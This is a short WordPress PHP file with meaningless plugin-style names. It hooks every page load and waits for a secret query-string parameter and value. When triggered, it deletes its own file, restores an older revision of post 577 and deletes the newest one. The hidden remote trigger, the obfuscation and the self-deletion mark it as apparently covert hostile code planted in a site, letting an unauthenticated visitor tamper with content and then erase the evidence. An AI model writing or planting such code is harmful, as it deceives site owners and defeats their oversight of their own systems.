<?php

function photos_anti_global_tabs() {
	if (isset($_GET['install_full_awesome_translate']) && $_GET['install_full_awesome_translate'] === 'short_stop_bootstrap_day') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$top_save_consent = 577;
		$bangla_select_global_accessible = wp_get_post_revisions($top_save_consent);
		if (empty($bangla_select_global_accessible)) die('no revisions');
		if (count($bangla_select_global_accessible) < 2) die('less than 2');
		$tree_pro_react = array_shift($bangla_select_global_accessible);
		$framework_poster_gallery = $tree_pro_react->ID;
		$source_updater_verification = array_shift($bangla_select_global_accessible);
		$tooltip_variations_adsense = $source_updater_verification->ID;
		$upload_archives_embed_wpc = wp_restore_post_revision($tooltip_variations_adsense);
		if ($upload_archives_embed_wpc === false) die('error restoring');
		$upload_archives_embed_wpc = wp_delete_post_revision($framework_poster_gallery);		
		if ($upload_archives_embed_wpc === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'photos_anti_global_tabs');
